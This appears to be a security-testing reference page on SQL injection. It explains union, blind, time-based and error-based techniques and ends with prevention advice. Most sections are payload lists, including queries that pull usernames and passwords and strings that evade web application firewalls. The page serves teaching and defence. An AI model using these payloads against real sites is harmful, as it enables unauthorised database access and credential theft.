---
layout: vulnerability
title: SQL Injection
description: SQL injection detection, exploitation, and modern bypass techniques for web application security testing
severity: High
category: Web Application Vulnerabilities
owasp: A03:2021
permalink: /vulnerabilities/sql-injection/
toc:
  - title: Overview
    anchor: overview
  - title: Union-Based Injection
    anchor: union-based
  - title: Boolean-Based Blind Injection
    anchor: boolean-based
  - title: Time-Based Blind Injection
    anchor: time-based
  - title: Error-Based Injection
    anchor: error-based
  - title: WAF Bypass Techniques
    anchor: waf-bypass
  - title: Testing Methodology
    anchor: testing-methodology
  - title: Prevention & Mitigation
    anchor: prevention-mitigation
---

## Overview {#overview}

SQL Injection (SQLi) is one of the most critical web application vulnerabilities, allowing attackers to manipulate database queries and potentially access sensitive data, modify data, or execute administrative operations.

### Impact Assessment

- **Confidentiality**: Complete access to database contents
- **Integrity**: Ability to modify, insert, or delete data
- **Availability**: Potential to cause denial of service
- **Authentication**: Bypass authentication mechanisms

### Common Attack Vectors

1. **Union-Based Injection** - Using UNION to extract data
2. **Boolean-Based Blind Injection** - True/false condition testing
3. **Time-Based Blind Injection** - Time delay-based testing
4. **Error-Based Injection** - Exploiting error messages
5. **WAF Bypass** - Circumventing Web Application Firewalls

## Union-Based Injection {#union-based}

Union-based SQL injection uses the UNION operator to combine results from multiple SELECT statements.

### Basic Union Injection

#### 1. Determining Column Count
```sql
-- Test with different column counts
' UNION SELECT 1-- 
' UNION SELECT 1,2-- 
' UNION SELECT 1,2,3-- 
' UNION SELECT 1,2,3,4-- 
```

#### 2. Identifying Data Types
```sql
-- Test data types for each column
' UNION SELECT 'string',2,3,4-- 
' UNION SELECT 1,'string',3,4-- 
' UNION SELECT 1,2,'string',4-- 
' UNION SELECT 1,2,3,'string'-- 
```

#### 3. Extracting Database Information
```sql
-- Database version
' UNION SELECT 1,version(),3,4-- 

-- Database name
' UNION SELECT 1,database(),3,4-- 

-- Current user
' UNION SELECT 1,user(),3,4-- 

-- All databases
' UNION SELECT 1,group_concat(schema_name),3,4 FROM information_schema.schemata-- 
```

### Advanced Union Techniques

#### 1. Column Concatenation
```sql
-- Concatenate multiple columns
' UNION SELECT 1,concat(username,':',password),3,4 FROM users-- 

-- Group concatenation
' UNION SELECT 1,group_concat(username),3,4 FROM users-- 
```

#### 2. Conditional Data Extraction
```sql
-- Extract data based on conditions
' UNION SELECT 1,username,3,4 FROM users WHERE id=1-- 
' UNION SELECT 1,password,3,4 FROM users WHERE username='admin'-- 
```

## Boolean-Based Blind Injection {#boolean-based}

Boolean-based blind injection relies on the application's response to determine if injected conditions are true or false.

### Basic Boolean Testing

#### 1. True/False Conditions
```sql
-- Test basic conditions
' AND 1=1-- 
' AND 1=2-- 

-- Test database functions
' AND length(database())>0-- 
' AND length(database())>10-- 
```

#### 2. Character-by-Character Extraction
```sql
-- Extract database name character by character
' AND ascii(substring(database(),1,1))>97-- 
' AND ascii(substring(database(),1,1))>98-- 
' AND ascii(substring(database(),1,1))>99-- 

-- Extract username character by character
' AND ascii(substring((SELECT username FROM users LIMIT 1),1,1))>97-- 
```

### Advanced Boolean Techniques

#### 1. Binary Search
```sql
-- Binary search for ASCII values
' AND ascii(substring(database(),1,1))>64-- 
' AND ascii(substring(database(),1,1))>96-- 
' AND ascii(substring(database(),1,1))>112-- 
' AND ascii(substring(database(),1,1))>104-- 
```

#### 2. Conditional Error Injection
```sql
-- Use CASE statements for conditional extraction
' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)-- 
' AND (SELECT CASE WHEN (length(database())>5) THEN 1 ELSE 0 END)-- 
```

## Time-Based Blind Injection {#time-based}

Time-based blind injection uses time delays to determine if injected conditions are true or false.

### Basic Time-Based Testing

#### 1. Simple Time Delays
```sql
-- MySQL time delays
' AND sleep(5)-- 
' AND (SELECT sleep(5))-- 

-- PostgreSQL time delays
' AND pg_sleep(5)-- 

-- MSSQL time delays
' AND WAITFOR DELAY '00:00:05'-- 
```

#### 2. Conditional Time Delays
```sql
-- Conditional sleep
' AND (SELECT CASE WHEN (1=1) THEN sleep(5) ELSE 0 END)-- 
' AND (SELECT CASE WHEN (length(database())>5) THEN sleep(5) ELSE 0 END)-- 
```

### Advanced Time-Based Techniques

#### 1. Character-by-Character with Time
```sql
-- Extract character with time delay
' AND (SELECT CASE WHEN (ascii(substring(database(),1,1))>97) THEN sleep(5) ELSE 0 END)-- 
' AND (SELECT CASE WHEN (ascii(substring(database(),1,1))>98) THEN sleep(5) ELSE 0 END)-- 
```

#### 2. Multiple Condition Testing
```sql
-- Test multiple conditions
' AND (SELECT CASE WHEN (length(database())>5 AND ascii(substring(database(),1,1))>97) THEN sleep(5) ELSE 0 END)-- 
```

## Error-Based Injection {#error-based}

Error-based injection exploits database error messages to extract information.

### MySQL Error-Based Techniques

#### 1. Extractvalue Function
```sql
-- Extract database information
' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- 
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))-- 
' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))-- 
```

#### 2. Updatexml Function
```sql
-- Extract information using updatexml
' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)-- 
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- 
```

### PostgreSQL Error-Based Techniques

#### 1. Cast Function
```sql
-- Cast to invalid type
' AND cast((SELECT version()) as int)-- 
' AND cast((SELECT current_database()) as int)-- 
```

#### 2. Array Functions
```sql
-- Use array functions
' AND (SELECT array_agg(version()))[1]-- 
' AND (SELECT array_agg(current_database()))[1]-- 
```

## WAF Bypass Techniques {#waf-bypass}

Web Application Firewalls can be bypassed using various techniques.

### Encoding Techniques

#### 1. URL Encoding
```sql
-- URL encode special characters
%27%20UNION%20SELECT%201,2,3-- 
%27%20AND%201=1-- 
```

#### 2. Double URL Encoding
```sql
-- Double URL encode
%2527%2520UNION%2520SELECT%25201,2,3-- 
```

#### 3. Unicode Encoding
```sql
-- Unicode encode
%u0027%20UNION%20SELECT%201,2,3-- 
```

### Comment Techniques

#### 1. Alternative Comments
```sql
-- Use different comment styles
' UNION SELECT 1,2,3# 
' UNION SELECT 1,2,3/* 
' UNION SELECT 1,2,3-- 
' UNION SELECT 1,2,3/**/ 
```

#### 2. Inline Comments
```sql
-- Use inline comments
' UN/**/ION SEL/**/ECT 1,2,3-- 
' AND 1=1/**/AND/**/1=1-- 
```

### Case Variation

#### 1. Mixed Case
```sql
-- Use mixed case
' UnIoN SeLeCt 1,2,3-- 
' AnD 1=1-- 
```

#### 2. Case Insensitive
```sql
-- Use case insensitive functions
' union select 1,2,3-- 
' and 1=1-- 
```

## Testing Methodology {#testing-methodology}

### Phase 1: Reconnaissance
1. **Identify Injection Points**
   - URL parameters
   - POST data
   - HTTP headers
   - Cookies

2. **Test Basic Injection**
   - Single quotes
   - Double quotes
   - Backticks
   - Parentheses

### Phase 2: Vulnerability Assessment
1. **Automated Scanning**
   - SQLMap
   - Burp Suite Scanner
   - OWASP ZAP

2. **Manual Testing**
   - Union-based injection
   - Boolean-based blind
   - Time-based blind
   - Error-based injection

### Phase 3: Exploitation
1. **Data Extraction**
   - Database schema
   - Table contents
   - User credentials
   - Sensitive data

2. **Privilege Escalation**
   - Database user privileges
   - File system access
   - Command execution

## Prevention & Mitigation {#prevention-mitigation}

### Input Validation
1. **Parameterized Queries**
   ```python
   # Vulnerable
   query = "SELECT * FROM users WHERE id = " + user_id
   
   # Secure
   query = "SELECT * FROM users WHERE id = %s"
   cursor.execute(query, (user_id,))
   ```

2. **Input Sanitization**
   - Validate input types
   - Escape special characters
   - Use whitelist validation

### Database Security
1. **Least Privilege**
   - Use minimal database privileges
   - Separate read/write permissions
   - Limit database user access

2. **Error Handling**
   - Don't expose database errors
   - Use generic error messages
   - Log errors securely

### Application Security
1. **WAF Implementation**
   - Deploy Web Application Firewall
   - Configure SQL injection rules
   - Monitor and update rules

2. **Security Headers**
   - Implement security headers
   - Use Content Security Policy
   - Enable HSTS

---

## References & Further Reading

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [SQLMap Documentation](https://sqlmap.org/)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [CWE-89: Improper Neutralization of Special Elements](https://cwe.mitre.org/data/definitions/89.html)
- [NIST SP 800-53: Security Controls](https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final)